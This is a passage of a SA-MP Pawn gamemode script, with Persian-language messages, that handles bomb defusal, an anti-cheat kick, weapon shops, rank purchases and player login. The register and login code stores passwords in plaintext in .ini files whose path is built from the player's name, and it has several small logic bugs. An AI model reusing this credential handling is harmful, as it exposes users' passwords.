    				SendClientMessageToAll(COLOR_BLUE, "{33CCFF}CS-BOT: {AA3333}Bomb {FFFF00}Defuse");
    			}
				}
}
	}
	else if(gteam[playerid]==1 && BombPlanted == 1)
	{
	if(IsPlayerInRangeOfPoint(playerid, 5.0,-967.5349,2363.2842,138.5429) || IsPlayerInRangeOfPoint(playerid, 5.0,-1151.0432,2401.4204,146.7129 )){
            
				SetTimer("mytimer", 10000,0);

    			TogglePlayerControllable(playerid, 0);
    			ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 10.0, 0, 0, 0, 0, 2000);

				}
	}
		}
	return 1;
}

public OnRconLoginAttempt(ip[], password[], success)
{
	return 1;
}

public OnPlayerUpdate(playerid)
{
    CheckWeapons(playerid);
    attachweapon(playerid);

     if(GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_USEJETPACK) 
    {
        if(JetPack[playerid] == 0) 
        {
			if(MapChange == 5 || MapChange == 6 || MapChange == 0) return 1;
			

             new str[256];
             format(str,sizeof(str),"{e56d39}[ANTICHEAT] {7b92b5}Player %s Tavasot AntiCheat Az Server Kick Shod (Reason:JetPack-Hack)",GetName(playerid));
             SendClientMessageToAll(-1,str);
             Kick(playerid);
        }
        else 
            return 1; 
    }
    else JetPack[playerid] = 0; 
	return 1;
}
public OnPlayerStreamIn(playerid, forplayerid)
{
	return 1;
}

public OnPlayerStreamOut(playerid, forplayerid)
{
	return 1;
}

public OnVehicleStreamIn(vehicleid, forplayerid)
{
	return 1;
}

public OnVehicleStreamOut(vehicleid, forplayerid)
{
	return 1;
}
public OnVehicleDamageStatusUpdate(vehicleid, playerid)
{
if(vehicleid == g_Vehicle[0])RepairVehicle(g_Vehicle[0]);
	return 1;
}
public dos(playerid)
{
TextDrawSetString(tdw5,"www.Sa-mp.com");
TextDrawSetString(tdw6,"Owner: Amir");
return 1;
}
public dok(playerid)
{
 TogglePlayerSpectating(playerid, true);
 TextDrawHideForPlayer(playerid, Don);
TextDrawHideForPlayer(playerid, Textdrawa);
    TextDrawHideForPlayer(playerid, Textdrawb);
    TextDrawHideForPlayer(playerid, Textdrawc);
    TextDrawHideForPlayer(playerid, Textdrawd);
    TextDrawHideForPlayer(playerid, Textdrawe);
    TextDrawHideForPlayer(playerid, Textdraw5);
    TextDrawHideForPlayer(playerid, Textdraw6);
    TextDrawHideForPlayer(playerid, Textdraw7);
    TextDrawHideForPlayer(playerid, Textdraw8);
    TextDrawHideForPlayer(playerid, Textdraw9);
    TextDrawHideForPlayer(playerid, Textdraw10);
    TextDrawHideForPlayer(playerid, bg);
    TextDrawHideForPlayer(playerid, Textdraw12);
    TextDrawHideForPlayer(playerid, Textdraw13);
    TextDrawHideForPlayer(playerid, Textdraw14);
    TextDrawHideForPlayer(playerid, Textdraw15);
    TextDrawHideForPlayer(playerid, Textdraw16);
    TextDrawHideForPlayer(playerid, Textdraw17);
    TextDrawHideForPlayer(playerid, Textdraw18);
    TextDrawHideForPlayer(playerid, Textdraw19);
    TextDrawHideForPlayer(playerid, Textdraw20);
    TextDrawHideForPlayer(playerid, Textdraw21);
    TextDrawHideForPlayer(playerid, Textdraw22);
 TextDrawShowForPlayer(playerid, tdw1);
 TextDrawShowForPlayer(playerid, tdw0);
                 TextDrawShowForPlayer(playerid, tdw2);
                 TextDrawShowForPlayer(playerid, tdw3);
                 TextDrawShowForPlayer(playerid, tdw4);
                 TextDrawShowForPlayer(playerid, tdw5);
                 TextDrawShowForPlayer(playerid, tdw6);
                 TextDrawShowForPlayer(playerid, tdw7);
                 TextDrawShowForPlayer(playerid, tdw8);
	reg[playerid] = 0;
                 TogglePlayerSpectating(playerid, true);
			SetPlayerCameraPos(playerid,-1590.5505,640.1832,42.5899);
			SetPlayerCameraLookAt(playerid,-1212.1045,789.4034,51.7474);
			InterpolateCameraPos(playerid, 1446.841064, -1476.357299, 220.839019, 1396.063476, -874.557678, 79.872444, 10000);
			InterpolateCameraLookAt(playerid, 1449.527709, -1472.393554, 219.399948, 1397.009155, -869.666503, 80.298919, 10000);
                 TextDrawShowForPlayer(playerid, tdw8); TextDrawShowForPlayer(playerid, tdw8);

                 ApplyActorAnimation(g_Actor[0], "BEACH", "PARKSIT_M_LOOP", 4.0999, 1, 0, 0, 0, 0);
ApplyActorAnimation(g_Actor[1], "BEACH", "PARKSIT_M_LOOP", 4.0999, 1, 0, 0, 0, 0);
  


 return 1;
}
public hd(playerid)
{
     TextDrawHideForPlayer(playerid, tdw1);
 TextDrawHideForPlayer(playerid, tdw0);
                 TextDrawHideForPlayer(playerid, tdw2);
                 TextDrawHideForPlayer(playerid, tdw3);
                 TextDrawHideForPlayer(playerid, tdw4);
                 TextDrawHideForPlayer(playerid, tdw5);
                 TextDrawHideForPlayer(playerid, tdw6);
                 TextDrawHideForPlayer(playerid, tdw7);
                 TextDrawHideForPlayer(playerid, tdw8);
                 reg[playerid] = 1;
				 reg[playerid] = 1;
                 SCM(playerid,-1,"Agar Az Server Kick Shodid Dobare Be Server Connect Shavid");
                  ForceClassSelection(playerid);
                  SpawnPlayer(playerid);
				 SetPlayerHealth(playerid,0);
				
                 return 1;
}
public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
new pname[MAX_PLAYER_NAME], path[200];
GetPlayerName(playerid, pname, sizeof(pname));
format(path, sizeof(path), "/spieler/%s.ini", pname);
    switch( dialogid )
    {
    	case DIALOG_GUNS:
    {
    if(!response)
  	{
  	return 1;
	}
	    new gunlevel[256];
		if(Upgrade[playerid] == true)
		{
			if(IsGunSelection[playerid] == 1)
			{
				PlayerInfo[playerid][pAk]++;
				format(gunlevel,sizeof(gunlevel),"Level: ~g~%d",PlayerInfo[playerid][pAk]);
				PlayerTextDrawSetString(playerid,aklevel[playerid],gunlevel);
				if(PlayerInfo[playerid][pAk] == 1) GivePlayerMoneyEx(playerid,-300000);
				if(PlayerInfo[playerid][pAk] == 2) GivePlayerMoneyEx(playerid,-400000);
                if(PlayerInfo[playerid][pAk] == 3) GivePlayerMoneyEx(playerid,-500000);
			}
				if(IsGunSelection[playerid] == 2)
			{
				PlayerInfo[playerid][pM4]++;
				format(gunlevel,sizeof(gunlevel),"Level: ~g~%d",PlayerInfo[playerid][pM4]);
				PlayerTextDrawSetString(playerid,m4level[playerid],gunlevel);
				if(PlayerInfo[playerid][pM4] == 1) GivePlayerMoneyEx(playerid,-600000);
				if(PlayerInfo[playerid][pM4] == 2) GivePlayerMoneyEx(playerid,-800000);
                if(PlayerInfo[playerid][pM4] == 3) GivePlayerMoneyEx(playerid,-1000000);
			}
				if(IsGunSelection[playerid] == 3)
			{
				PlayerInfo[playerid][pSnipe]++;
			 	format(gunlevel,sizeof(gunlevel),"Level: ~g~%d",PlayerInfo[playerid][pSnipe]);
				PlayerTextDrawSetString(playerid,snipelevel[playerid],gunlevel);
				if(PlayerInfo[playerid][pSnipe] == 1) GivePlayerMoneyEx(playerid,-2000000);
			}
				if(IsGunSelection[playerid] == 4)
			{
				PlayerInfo[playerid][pMp5]++;
				format(gunlevel,sizeof(gunlevel),"Level: ~g~%d",PlayerInfo[playerid][pMp5]);
				PlayerTextDrawSetString(playerid,mp5level[playerid],gunlevel);
				if(PlayerInfo[playerid][pMp5] == 1) GivePlayerMoneyEx(playerid,-800000);
				if(PlayerInfo[playerid][pMp5] == 2) GivePlayerMoneyEx(playerid,-1200000);
			}
			if(IsGunSelection[playerid] == 5)
			{
				PlayerInfo[playerid][pShotgun]++;
				format(gunlevel,sizeof(gunlevel),"Level:~g~ %d",PlayerInfo[playerid][pShotgun]);
				PlayerTextDrawSetString(playerid,shotgunlevel[playerid],gunlevel);
				if(PlayerInfo[playerid][pShotgun] == 1) GivePlayerMoneyEx(playerid,-5000000);
			}
			if(IsGunSelection[playerid] == 6)
			{
				PlayerInfo[playerid][pSawn]++;
				format(gunlevel,sizeof(gunlevel),"Level: ~g~%d",PlayerInfo[playerid][pSawn]);
				PlayerTextDrawSetString(playerid,sawnlevel[playerid],gunlevel);
				if(PlayerInfo[playerid][pShotgun] == 1) GivePlayerMoneyEx(playerid,-5500000);
			}
		}
		else
		{
            if(IsGunSelection[playerid] == 1)
			{
			    PlayerInfo[playerid][pAk]++;
			  	format(gunlevel,sizeof(gunlevel),"Level: ~b~%d",PlayerInfo[playerid][pAk]);
				PlayerTextDrawSetString(playerid,aklevel[playerid],gunlevel);
			    PlayerTextDrawShow(playerid,aklevel[playerid]);
			    GivePlayerMoneyEx(playerid,-200000);
			}
			 if(IsGunSelection[playerid] == 2)
			{
			    PlayerInfo[playerid][pM4]++;
			    format(gunlevel,sizeof(gunlevel),"Level: ~b~%d",PlayerInfo[playerid][pM4]);
				PlayerTextDrawSetString(playerid,m4level[playerid],gunlevel);
			    PlayerTextDrawShow(playerid,m4level[playerid]);
			    GivePlayerMoneyEx(playerid,-600000);
			}
			 if(IsGunSelection[playerid] == 3)
			{
			    PlayerInfo[playerid][pSnipe]++;
			    format(gunlevel,sizeof(gunlevel),"Level: %d",PlayerInfo[playerid][pSnipe]);
				PlayerTextDrawSetString(playerid,snipelevel[playerid],gunlevel);
			    PlayerTextDrawShow(playerid,snipelevel[playerid]);
			    GivePlayerMoneyEx(playerid,-1500000);
			}
			 if(IsGunSelection[playerid] == 4)
			{
			    PlayerInfo[playerid][pMp5]++;
			    format(gunlevel,sizeof(gunlevel),"Level: ~b~%d",PlayerInfo[playerid][pMp5]);
				PlayerTextDrawSetString(playerid,mp5level[playerid],gunlevel);
			    PlayerTextDrawShow(playerid,mp5level[playerid]);
			    GivePlayerMoneyEx(playerid,-500000);
			}
			 if(IsGunSelection[playerid] == 5)
			{
			    PlayerInfo[playerid][pShotgun]++;
			     format(gunlevel,sizeof(gunlevel),"Level: ~b~%d",PlayerInfo[playerid][pShotgun]);
				PlayerTextDrawSetString(playerid,shotgunlevel[playerid],gunlevel);
			    PlayerTextDrawShow(playerid,shotgunlevel[playerid]);
			    GivePlayerMoneyEx(playerid,-2000000);
			}
			 if(IsGunSelection[playerid] == 6)
			{
			    PlayerInfo[playerid][pSawn]++;
			     format(gunlevel,sizeof(gunlevel),"Level: ~b~%d",PlayerInfo[playerid][pSawn]);
				PlayerTextDrawSetString(playerid,sawnlevel[playerid],gunlevel);
			    PlayerTextDrawShow(playerid,sawnlevel[playerid]);
			    GivePlayerMoneyEx(playerid,-3000000);
			}
			
		}
		return 1;
	}
        case DIALOG_REGISTER1:
   {
  	if(!response)
  	{
  	    SCM(playerid,-1,"");
      	Kick(playerid);
  	}
  	else
  	{
     	if(strlen(inputtext) >= 6)
     	{
        	dini_Create(path); //i
        	dini_Set(path, "password", inputtext);
        	dini_IntSet(path, "Admin", 0);
        	dini_IntSet(path, "Score", 0);
        	dini_IntSet(path, "Vip", 0);
        	dini_IntSet(path, "Tala", 0);
        	dini_IntSet(path, "Kills", 0);
        	dini_IntSet(path, "Deaths", 0);
        	dini_IntSet(path, "Cash", 0);
        	dini_IntSet(path, "Clan", 0);
        	dini_IntSet(path, "Rank", 0);
        	dini_IntSet(path, "Drugs",0);
			dini_IntSet(path, "Ak",0);
			dini_IntSet(path, "M4",0);
			dini_IntSet(path, "Snipe",0);
			dini_IntSet(path, "Mp5",0);
			dini_IntSet(path, "ShotGun",0);
			dini_IntSet(path, "Sawn",0);
			
        	GroupInfo[playerid][cNumbers] = dini_Int(cpath, "Numbers");
        	
           	PlayerInfo[playerid][pAdmin] = dini_Int(path, "Admin");
       		PlayerInfo[playerid][pRank] = dini_Int(path, "Rank");
           	PlayerInfo[playerid][pClan] = dini_Int(path, "Clan");
           	PlayerInfo[playerid][pVip] = dini_Int(path, "Vip");
           	PlayerInfo[playerid][pCash] = dini_Int(path, "Cash");
           	PlayerInfo[playerid][pKills] = dini_Int(path, "Kills");
           	PlayerInfo[playerid][pDeaths] = dini_Int(path, "Deaths");
           	PlayerInfo[playerid][pTala] = dini_Int(path, "Tala");
           	PlayerInfo[playerid][pScore] = dini_Int(path, "Score");
           	PlayerInfo[playerid][pDrugs] = dini_Int(path, "Drugs");
           	PlayerInfo[playerid][pAk] = dini_Int(path,"Ak");
           	PlayerInfo[playerid][pM4] = dini_Int(path,"M4");
           	PlayerInfo[playerid][pSnipe] = dini_Int(path,"Snipe");
           	PlayerInfo[playerid][pMp5] = dini_Int(path,"Mp5");
           	PlayerInfo[playerid][pShotgun] = dini_Int(path,"ShotGun");
           	PlayerInfo[playerid][pSawn] = dini_Int(path,"Sawn");
           	SetPlayerScore(playerid,PlayerInfo[playerid][pScore]);
           	reg[playerid] = 1;
            PlayerInfo[playerid][pLog] = 1;
     	}
     	else
     	{
        	ShowPlayerDialog(playerid, DIALOG_REGISTER1, DIALOG_STYLE_INPUT, "Register", "Password Ra Vared Konid (6 Character)", "OK", "Cancel");
     	}
  	}
   }

   case DIALOG_LOGIN1:
   {
  	if(!response) {SCM(playerid,-1,""); Kick(playerid);}

     	if(strlen(inputtext) >= 6)
     	{
        	new pw[200];
        	format(pw, sizeof(pw), "%s",dini_Get(path,"password"));
        	if(!strcmp(pw, inputtext))
        	{
        	reg[playerid] = 1;
            PlayerInfo[playerid][pLog] = 1;
            GroupInfo[playerid][cNumbers] = dini_Int(cpath, "Numbers");
           	PlayerInfo[playerid][pAdmin] = dini_Int(path, "Admin");
       		PlayerInfo[playerid][pRank] = dini_Int(path, "Rank");
           	PlayerInfo[playerid][pClan] = dini_Int(path, "Clan");
           	PlayerInfo[playerid][pVip] = dini_Int(path, "Vip");
           	PlayerInfo[playerid][pCash] = dini_Int(path, "Cash");
           	PlayerInfo[playerid][pKills] = dini_Int(path, "Kills");
           	PlayerInfo[playerid][pDeaths] = dini_Int(path, "Deaths");
           	PlayerInfo[playerid][pTala] = dini_Int(path, "Tala");
           	PlayerInfo[playerid][pScore] = dini_Int(path, "Score");
           	PlayerInfo[playerid][pDrugs] = dini_Int(path, "Drugs");
           	PlayerInfo[playerid][pAk] = dini_Int(path,"Ak");
           	PlayerInfo[playerid][pM4] = dini_Int(path,"M4");
           	PlayerInfo[playerid][pSnipe] = dini_Int(path,"Snipe");
           	PlayerInfo[playerid][pMp5] = dini_Int(path,"Mp5");
           	PlayerInfo[playerid][pShotgun] = dini_Int(path,"ShotGun");
           	PlayerInfo[playerid][pSawn] = dini_Int(path,"Sawn");
           	
           	SetPlayerScore(playerid,PlayerInfo[playerid][pScore]);
           	GivePlayerMoneyEx(playerid,PlayerInfo[playerid][pCash]);
            SetPlayerCameraLookAt(playerid, -2231.992675, -1738.325439, 480.938598);
			SetPlayerCameraPos(playerid, -2231.992675 + (5 * floatsin(-40.234375, degrees)), -1738.325439 + (5 * floatcos(-40.234375, degrees)), 480.938598);
        	}
        	else
        	{
           	ShowPlayerDialog(playerid, DIALOG_WRONGPW, DIALOG_STYLE_MSGBOX, "Login", "Wrong Password(6 Character)!", "OK", "Cancel");
        	}
     	}
     	else
     	{
        	ShowPlayerDialog(playerid, DIALOG_NOPW2, DIALOG_STYLE_MSGBOX,  "Login", "You have to enter a password! (6 Character)", "OK", "Cancel");
     	}
  	}

  case DIALOG_NOPW1:
  {
 	if(!response)
 	{
    	Kick(playerid);
 	}
 	else
 	{
    	ShowPlayerDialog(playerid, DIALOG_REGISTER1, DIALOG_STYLE_INPUT,  "Register", "Your Password (6 Character)", "OK",  "Cancel");
 	}
  }
  case DIALOG_NOPW2:
  {
 	if(!response)
 	{
    	Kick(playerid);
 	}
 	else
 	{
    	 ShowPlayerDialog(playerid, DIALOG_LOGIN1, DIALOG_STYLE_INPUT,   "Login", "Your Password (6 Character)", "OK",   "cancel");
 	}
  }
  case DIALOG_WRONGPW:
  {
 	if(!response)
 	{
    	Kick(playerid);
 	}
 	else
 	{
    	 ShowPlayerDialog(playerid, DIALOG_LOGIN1, DIALOG_STYLE_INPUT,    "Login", "Your Password (6 Character)", "OK",   "Cancel");
 	}
  }

 case DIALOG_SPAWN_CLASS:
	    {
	        if( response )
	        {
	            switch( listitem )
	            {
	                case 0: // Class 1
	                {
                                 gteam[playerid] = 1;
                                 SpawnPlayer(playerid);
	                }
	                case 1: //class 2
	                {
	                gteam[playerid] = 2;
	                
				 SpawnPlayer(playerid);
	                
	                }
	                // and soo on
	            }
	        }
		           }

case DIACOIN:
{
           if( response )
	        {
	            switch( listitem )
			 {

			 case 0: // Class 1
	                {
                       new string[400];
				 //Kharid VIP
				 if(PlayerInfo[playerid][pTala] <= 250) return SCM(playerid , COLOR_RED,"[SHOP]{ffffff} Shoma Talaye Kafi Nadarid");
				 PlayerInfo[playerid][pTala] -= 250;
				 PlayerInfo[playerid][pVip] = 1;
				 format(string,sizeof(string),"{92abd3}[StaffNews] {ffffff} Player {727375} %s {ffffff} Be Onvane{7bc489} VIP{ffffff} Entekhab Shod!",GetName(playerid));
                 SendClientMessageToAll(COLOR_RED,string);
				 return 1;
	                }
	                case 1: //class 2
	                {
	                new string[400];
				 if(PlayerInfo[playerid][pTala] <= 750) return SCM(playerid , COLOR_RED,"[SHOP]{ffffff} Shoma Talaye Kafi Nadarid");
				 PlayerInfo[playerid][pTala] -= 750;
				 PlayerInfo[playerid][pAdmin] = 5;
				 format(string,sizeof(string),"{92abd3}[StaffNews] {ffffff} Player {727375} %s {ffffff} Be Onvane{7bc489} ADMIN{ffffff} Entekhab Shod!",GetName(playerid));
                 SendClientMessageToAll(COLOR_RED,string);
				 return 1;            
	                }
	                case 2: // class 3
	                {
	                new string[400];
	               if(PlayerInfo[playerid][pTala] <= 1500) return SCM(playerid , COLOR_RED,"[SHOP]{ffffff} Shoma Talaye Kafi Nadarid");
				 PlayerInfo[playerid][pTala] -= 1500;
				 PlayerInfo[playerid][pAdmin] = 7;
				 format(string,sizeof(string),"{92abd3}[StaffNews] {ffffff} Player {727375} %s {ffffff} Be Onvane{7bc489} OWNER{ffffff} Entekhab Shod!",GetName(playerid));
                 SendClientMessageToAll(COLOR_RED,string);
				 return 1;            
	                }
	                case 3:{
	                new string[400];
                 if(PlayerInfo[playerid][pTala] <= 7000) return SCM(playerid , COLOR_RED,"[SHOP]{ffffff} Shoma Talaye Kafi Nadarid");
				 PlayerInfo[playerid][pTala] -= 7000;
				 PlayerInfo[playerid][pAdmin] = 8;
				 format(string,sizeof(string),"{92abd3}[StaffNews] {ffffff} Player {727375} %s {ffffff} Be Onvane{7bc489} ModirMali{ffffff} Entekhab Shod!",GetName(playerid));
                 SendClientMessageToAll(COLOR_RED,string);
				 return 1;
					 }
	                case 4:{
	                new string[400];
                 if(PlayerInfo[playerid][pTala] <= 100) return SCM(playerid , COLOR_RED,"[SHOP]{ffffff} Shoma Talaye Kafi Nadarid");
				 PlayerInfo[playerid][pTala] -= 100;
				 PlayerInfo[playerid][pCash] += 20000000;
                 GivePlayerMoneyEx(playerid,20000000);
				 format(string,sizeof(string),"{92abd3}[SHOP] {ffffff} Player {727375} %s {ffffff} Az Shop{7bc489} $20.000.000{ffffff} Kharidari Kard!",GetName(playerid));
                 SendClientMessageToAll(COLOR_RED,string);
					}
					 case 5:{
					 new string[400];
                 if(PlayerInfo[playerid][pTala] <= 100) return SCM(playerid , COLOR_RED,"[SHOP]{ffffff} Shoma Talaye Kafi Nadarid");
				 PlayerInfo[playerid][pTala] -= 100;
				 PlayerInfo[playerid][pScore] += 200;
				 SetPlayerScore(playerid,GetPlayerScore(playerid)+200);
                 //GivePlayerMoneyEx(playerid,20000000);
				 format(string,sizeof(string),"{92abd3}[SHOP] {ffffff} Player {727375} %s {ffffff} Az Shop{7bc489} 200 Score{ffffff} Kharidari Kard!",GetName(playerid));
                 SendClientMessageToAll(COLOR_RED,string);
					}
			 }
			 	return 1;
}
}
case DIALOG_WEAPON:
				  {
                        if( response )
	        {
	            switch( listitem )
	            {
	                case 0: // Class 1
	                {
                        GivePlayerWeaponEx(playerid,4,1);
	                }
	                case 1: //class 2
	                {
				 if(PlayerInfo[playerid][pVip] >= 1)
	                GivePlayerWeaponEx(playerid,9,1); else SendClientMessage(playerid,-1,"Bayad{2ded0b} Vip {ffffff}Bashid");	                // SetPlayerPos( playerid,  );
	                }
	                case 2: // class 3
	                {
                 GivePlayerWeaponEx(playerid,16,5);
	                }
	                case 3:{ GivePlayerWeaponEx(playerid,22,200);}
	                case 4:{ GivePlayerWeaponEx(playerid,24,200);}
	                case 5: { GivePlayerWeaponEx(playerid,25,200);}
                 case 6:
					{
                         if(PlayerInfo[playerid][pVip] >= 1)
	                GivePlayerWeaponEx(playerid,26,1000); else SendClientMessage(playerid,-1,"Bayad{2ded0b} Vip {ffffff}Bashid");	                
					}
					case 7:{GivePlayerWeaponEx(playerid,30,200);}
					case 8:{GivePlayerWeaponEx(playerid,31,200);}
					case 9:{GivePlayerWeaponEx(playerid,32,200);}
					case 10:GivePlayerWeaponEx(playerid,34,200);
					case 11:
					{
						if(PlayerInfo[playerid][pCash] < 2000000) {SendClientMessage(playerid,-1,"Shoma Bayad {2ded0b}2.000.000{ffffff} Dashte Bashid"); return 1;}
						if(ponykey >= 300 && ponykey <= 9999){SendClientMessage(playerid,-1,"Ghablan Yeki Az Player Ha Pony Key Ra Kharide Ast"); return 1;}
                        ponykey = playerid;
                         new player[MAX_PLAYER_NAME];
			GetPlayerName(playerid, player, sizeof(player));
			new msg[500];
			PlayerInfo[playerid][pCash]-=2000000;
   			GivePlayerMoney(playerid,-2000000);
			format(msg,sizeof(msg),"{d1ca0c}[PONYKEY] {ffffff}Player {f23610}%s {1ee510}Pony Key {ffffff}Ra Kharidari Kard",player);
			SendClientMessageToAll(-1,msg);
					}
	                // and soo on
	            }
				  }
	    }

 }
    return 1;
}

public OnPlayerClickPlayer(playerid, clickedplayerid, source)
{
    	new name[40];
		GetPlayerName(clickedplayerid, name, sizeof(name));
		new pin[1024];
		format(pin, sizeof(pin), " Name: %s\n Kills %d\n Deaths: %s\n",name,PlayerInfo[clickedplayerid][pKills],PlayerInfo[clickedplayerid][pDeaths]);
		ShowPlayerDialog(playerid, 2101, DIALOG_STYLE_MSGBOX, "Player Stats:",pin, "ok", "Cancel");
	return 1;
}
public OnPlayerCommandPerformed(playerid, cmdtext[], success)
{
    if(success == 0)
   	return SendClientMessage(playerid, COLOR_RED, "[JG]-IR_TDM-[TDM]{ffffff}: In {a5ce84}Command{ffffff} Vojod Nadarad.{FFFF00} /cmds");
   	return 1;
}
forward timer2(playerid);
public timer2(playerid)
{
TogglePlayerControllable(playerid, 1);
return 1;
}
public OnPlayerGiveDamage(playerid, damagedid, Float:amount, weaponid, bodypart)
{
 new Float:nowhealth;
 GetPlayerHealth(damagedid,nowhealth);
 if(weaponid == 30)
 {
 	if(PlayerInfo[playerid][pAk] == 0) return 1;
 	if(PlayerInfo[playerid][pAk] == 1) SetPlayerHealth(damagedid,nowhealth-0.2);
 	if(PlayerInfo[playerid][pAk] == 2) SetPlayerHealth(damagedid,nowhealth-0.3);
 	if(PlayerInfo[playerid][pAk] == 3) SetPlayerHealth(damagedid,nowhealth-0.4);
 	if(PlayerInfo[playerid][pAk] == 4) SetPlayerHealth(damagedid,nowhealth-0.5);
 }
  if(weaponid == 31)
 {
 	if(PlayerInfo[playerid][pM4] == 0) return 1;
 	if(PlayerInfo[playerid][pM4] == 1) SetPlayerHealth(damagedid,nowhealth-0.4);
 	if(PlayerInfo[playerid][pM4] == 2) SetPlayerHealth(damagedid,nowhealth-0.6);
 	if(PlayerInfo[playerid][pM4] == 3) SetPlayerHealth(damagedid,nowhealth-0.8);
 	if(PlayerInfo[playerid][pM4] == 4) SetPlayerHealth(damagedid,nowhealth-1.0);
 }
  if(weaponid == 33)
 {
 	if(PlayerInfo[playerid][pSnipe] == 0) return 1;
 	if(PlayerInfo[playerid][pSnipe] == 1) SetPlayerHealth(damagedid,nowhealth-10.0);
 	if(PlayerInfo[playerid][pSnipe] == 2) SetPlayerHealth(damagedid,nowhealth-50.0);
 }
   if(weaponid == 29)
 {
 	if(PlayerInfo[playerid][pMp5] == 0) return 1;
 	if(PlayerInfo[playerid][pMp5] == 1) SetPlayerHealth(damagedid,nowhealth-0.1);
 	if(PlayerInfo[playerid][pMp5] == 2) SetPlayerHealth(damagedid,nowhealth-0.3);
 	if(PlayerInfo[playerid][pMp5] == 3) SetPlayerHealth(damagedid,nowhealth-0.6);
 	if(PlayerInfo[playerid][pMp5] == 4) SetPlayerHealth(damagedid,nowhealth-1.0);
 }
   if(weaponid == 25)
 {
 	if(PlayerInfo[playerid][pShotgun] == 0) return 1;
 	if(PlayerInfo[playerid][pShotgun] == 1) SetPlayerHealth(damagedid,nowhealth-10.0);
 	if(PlayerInfo[playerid][pShotgun] == 2) SetPlayerHealth(damagedid,nowhealth-60.0);
 }
    if(weaponid == 26)
 {
 	if(PlayerInfo[playerid][pShotgun] == 0) return 1;
 	if(PlayerInfo[playerid][pShotgun] == 1) SetPlayerHealth(damagedid,nowhealth-20.0);
 	if(PlayerInfo[playerid][pShotgun] == 2) SetPlayerHealth(damagedid,nowhealth-40.0);
 }
 return 1;
}
public OnPlayerTakeDamage(playerid, issuerid, Float:amount, weaponid,bodypart)
{

if(gteam[issuerid] == gteam[playerid])
{
 			 TogglePlayerControllable(issuerid, 0);
new Float:HP;
		    GetPlayerHealth(playerid, HP); // We get his HP.
  			 SetPlayerHealth(playerid, HP+amount);
GameTextForPlayer(issuerid, "~b~Ham ~r~Team ~b~Nazan", 1500, 5);
SetTimerEx("timer2",2000 , false, "d", issuerid);
return 1;
}
 else if(issuerid != INVALID_PLAYER_ID &&  bodypart == 9)
 {
 SetPlayerHealth(playerid, 0.0);
new infoString[500],
            weaponName[24],
            victimName[MAX_PLAYER_NAME],
            attackerName[MAX_PLAYER_NAME];
              GetPlayerName(playerid, victimName, sizeof (victimName));
        GetPlayerName(issuerid, attackerName, sizeof (attackerName));

        GetWeaponName(weaponid, weaponName, sizeof (weaponName));

        format(infoString, sizeof(infoString),"{cbe011}[HEADSHOT] {ffffff}Player:{11c1e0} %s {ffffff}Ba Tofang {e20b73}%s {ffffff} Player: {e88c0b}%s Ra HeadShot Kard {15d822}[+5 Emtiaz va +200.000]", attackerName,weaponName, victimName);
        SetPlayerScore(issuerid,GetPlayerScore(issuerid)+5);
        GivePlayerMoneyEx(issuerid,200000);
        PlayerInfo[issuerid][pScore] += 5;
        SendClientMessageToAll(-1, infoString);
 }
 return 1;
}


COMMAND:shop(playerid,params[])
{
	if(MapChange == 1) return SCM(playerid,-1,"Dar In Game Nmitavanid Estefade Konid");
	for(new n; n <= 13; n++)
	{
		TextDrawShowForPlayer(playerid,Gunstxd[n]);
	}
	PlayerTextDrawShow(playerid,aktxd[playerid]);
	PlayerTextDrawShow(playerid,m4txd[playerid]);
	PlayerTextDrawShow(playerid,snipetxd[playerid]);
	PlayerTextDrawShow(playerid,mp5txd[playerid]);
	PlayerTextDrawShow(playerid,sgtxd[playerid]);
	PlayerTextDrawShow(playerid,sawntxd[playerid]);
	PlayerTextDrawShow(playerid,close[playerid]);
	if(PlayerInfo[playerid][pAk] > 0) PlayerTextDrawShow(playerid,aklevel[playerid]);
	if(PlayerInfo[playerid][pM4] > 0) PlayerTextDrawShow(playerid,m4level[playerid]);
	if(PlayerInfo[playerid][pSnipe] > 0) PlayerTextDrawShow(playerid,snipelevel[playerid]);
	if(PlayerInfo[playerid][pMp5] > 0) PlayerTextDrawShow(playerid,mp5level[playerid]);
	if(PlayerInfo[playerid][pShotgun] > 0) PlayerTextDrawShow(playerid,shotgunlevel[playerid]);
	if(PlayerInfo[playerid][pSawn] > 0) PlayerTextDrawShow(playerid,sawnlevel[playerid]);
	new level[128];
    format(level,sizeof(level),"Level: ~r~%d",PlayerInfo[playerid][pAk]);
	PlayerTextDrawSetString(playerid,aklevel[playerid],level);
	format(level,sizeof(level),"Level: ~r~%d",PlayerInfo[playerid][pM4]);
	PlayerTextDrawSetString(playerid,m4level[playerid],level);
	format(level,sizeof(level),"Level: ~r~%d",PlayerInfo[playerid][pSnipe]);
	PlayerTextDrawSetString(playerid,snipelevel[playerid],level);
	format(level,sizeof(level),"Level: ~r~%d",PlayerInfo[playerid][pMp5]);
	PlayerTextDrawSetString(playerid,mp5level[playerid],level);
	format(level,sizeof(level),"Level: ~r~%d",PlayerInfo[playerid][pShotgun]);
	PlayerTextDrawSetString(playerid,shotgunlevel[playerid],level);
	format(level,sizeof(level),"Level: ~r~%d",PlayerInfo[playerid][pSawn]);
	PlayerTextDrawSetString(playerid,sawnlevel[playerid],level);
	SelectTextDraw(playerid, 0x00FF00FF);
	
	return 1;
}

COMMAND:kill(playerid,params[])
{
SetPlayerHealth(playerid,0);
new string[128],pname[128];
GetPlayerName(playerid,pname,sizeof(pname));
format(string,sizeof(string),"Player %s Killed himself.",pname);
SendMessageToAdmins(string);
return 1;
}
COMMAND:next(playerid,params[])
{


	return 1;
}

COMMAND:sw(playerid,params[])
{
	if(PlayerInfo[playerid][pAdmin] > 2){
    new NewWeather;
    if(sscanf(params, "i", NewWeather)) return SendClientMessage(playerid, COLOR_WHITE, "[Error] /sw [NewWeather]");
    SetAllWeather(NewWeather);
	}
	else    SendClientMessage(playerid, COLOR_WHITE, "Do Not Have Permission");
    return 1;
}
COMMAND:makeadmin(playerid,params[])
{
 if(PlayerInfo[playerid][pAdmin] > 8){
	new TargetID,
   			lvl;

	    if(sscanf(params, "ui", TargetID, lvl)) return SendClientMessage(playerid, COLOR_RED, "USAGE: /makeadmin [PlayerID] [level]");

	        if(TargetID == INVALID_PLAYER_ID) { SendClientMessage(playerid, COLOR_RED, "Invalid Player ID!"); return 1;}
	       new player[MAX_PLAYER_NAME],
				target[MAX_PLAYER_NAME];
	        GetPlayerName(playerid, player, sizeof(player));
			GetPlayerName(TargetID, target, sizeof(target));
   new msg[500];
